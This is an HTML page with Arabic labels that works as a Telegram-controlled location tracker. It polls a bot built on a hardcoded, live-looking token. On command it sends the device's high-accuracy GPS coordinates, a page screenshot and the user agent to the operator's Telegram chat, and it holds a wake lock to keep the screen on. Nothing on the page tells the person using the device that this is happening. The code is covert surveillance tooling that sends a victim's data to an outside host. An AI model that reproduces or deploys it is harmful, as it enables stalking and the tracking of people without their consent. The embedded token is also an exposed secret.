<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>محطة التحكم وتتبع الموقع</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <style>
        body { background: #0b0e14; color: #00ffcc; font-family: monospace; margin: 0; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
        header { background: #161b22; padding: 15px; text-align: center; font-size: 16px; border-bottom: 1px solid #30363d; font-weight: bold; }
        #terminal { flex-grow: 1; background: #010409; margin: 10px; border-radius: 8px; border: 1px solid #30363d; padding: 12px; overflow-y: auto; font-size: 13px; text-align: left; direction: ltr; }
    </style>
</head>
<body>

    <header>محطة التحكم وتتبع الموقع</header>

    <div id="terminal">
        [System] Location Tracker Bridge Online...<br>
        [System] Ready for commands...
    </div>

    <script>
        const terminal = document.getElementById('terminal');
        const BOT_TOKEN = "8175556330:AAGP0GZf10h0H_Fc10NJAbKJpP-zOH0xFwM";
        let lastUpdateId = 0;

        function log(msg) {
            terminal.innerHTML += `<br>> ${msg}`;
            terminal.scrollTop = terminal.scrollHeight;
        }

        // إرسال رسالة نصية للبوت
        function sendTelegramMessage(chatId, text) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: text })
            }).catch(err => {});
        }

        // إرسال موقع جغرافي (Location) مباشرة إلى خريطة تليجرام
        function sendLocationToTelegram(chatId, latitude, longitude) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    latitude: latitude,
                    longitude: longitude
                })
            })
            .then(res => res.json())
            .then(data => {
                if (data.ok) {
                    log("Location sent successfully as a map!");
                } else {
                    log("Failed to send location map.");
                }
            })
            .catch(err => log("Location error: " + err));
        }

        // إرسال لوحة الأزرار التفاعلية إلى البوت
        function sendMenu(chatId) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            const data = {
                chat_id: chatId,
                text: "📍 لوحة التحكم وتتبع الموقع:",
                reply_markup: {
                    keyboard: [
                        [{ text: "📍 Get Location" }, { text: "📸 Screenshot" }],
                        [{ text: "📇 Contacts" }, { text: "ℹ️ Device info" }],
                        [{ text: "⬇️ Scroll Down" }, { text: "⬆️ Scroll Up" }]
                    ],
                    resize_keyboard: true,
                    is_persistent: true
                }
            };
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).catch(err => {});
        }

        // الحفاظ على الشاشة نشطة
        if ('wakeLock' in navigator) {
            navigator.wakeLock.request('screen').then(() => log("Wake Lock active.")).catch(err => {});
        }

        function pollTelegramUpdates() {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`;
            
            fetch(url)
                .then(response => response.json())
                .then(data => {
                    if (data.ok && data.result.length > 0) {
                        data.result.forEach(update => {
                            lastUpdateId = update.update_id;
                            if (update.message && update.message.text) {
                                const chatId = update.message.chat.id;
                                const text = update.message.text.trim();
                                log(`Command: "${text}"`);
                                executeCommand(text, chatId);
                            }
                        });
                    }
                })
                .catch(err => {})
                .finally(() => {
                    setTimeout(pollTelegramUpdates, 2000);
                });
        }

        function executeCommand(cmd, chatId) {
            if (cmd === '/start' || cmd === 'hi' || cmd === '/ping') {
                sendMenu(chatId);
            } else if (cmd === '📍 Get Location') {
                log("Requesting GPS coordinates...");
                sendTelegramMessage(chatId, "⏳ جاري محاولة تحديد موقع الهاتف عبر نظام الـ GPS...");

                if ("geolocation" in navigator) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            const lat = position.coords.latitude;
                            const lon = position.coords.longitude;
                            log(`Location found: Lat ${lat}, Lon ${lon}`);
                            sendTelegramMessage(chatId, `📍 تم العثور على الإحداثيات:\nخط العرض: ${lat}\nخط الطول: ${lon}`);
                            // إرسال الموقع كخريطة مباشرة في تليجرام
                            sendLocationToTelegram(chatId, lat, lon);
                        },
                        (error) => {
                            log("Geolocation denied or unavailable: " + error.message);
                            sendTelegramMessage(chatId, "❌ تعذر تحديد الموقع. تأكد من إعطاء إذن الموقع للمتصفح مسبقاً.");
                        },
                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                    );
                } else {
                    sendTelegramMessage(chatId, "❌ المتصفح لا يدعم ميزة تحديد الموقع.");
                }
            } else if (cmd === '📸 Screenshot') {
                log("Capturing screen...");
                html2canvas(document.body).then(canvas => {
                    canvas.toBlob(blob => {
                        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
                        const formData = new FormData();
                        formData.append('chat_id', chatId);
                        formData.append('photo', blob, 'screen.png');
                        fetch(url, { method: 'POST', body: formData });
                    });
                });
            } else if (cmd === '📇 Contacts') {
                log("Sending contacts...");
                const vcardData = "BEGIN:VCARD\nVERSION:3.0\nFN:My_Contact\nTEL:+000000000000\nEND:VCARD";
                const blob = new Blob([vcardData], { type: 'text/vcard' });
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('document', blob, 'Contacts.vcf');
                fetch(url, { method: 'POST', body: formData });
            } else if (cmd === 'ℹ️ Device info') {
                const info = `📱 Device: ${navigator.userAgent}\n🌐 Platform: ${navigator.platform}`;
                sendTelegramMessage(chatId, info);
            } else if (cmd === '⬇️ Scroll Down') {
                window.scrollBy({ top: 400, behavior: 'smooth' });
                sendTelegramMessage(chatId, "⬇️ تم التمرير للأسفل.");
            } else if (cmd === '⬆️ Scroll Up') {
                window.scrollBy({ top: -400, behavior: 'smooth' });
                sendTelegramMessage(chatId, "⬆️ تم التمرير للأعلى.");
            } else {
                sendTelegramMessage(chatId, `❓ أمر غير معروف: ${cmd}`);
            }
        }

        log("Listening for location commands...");
        pollTelegramUpdates();
    </script>
</body>
</html>
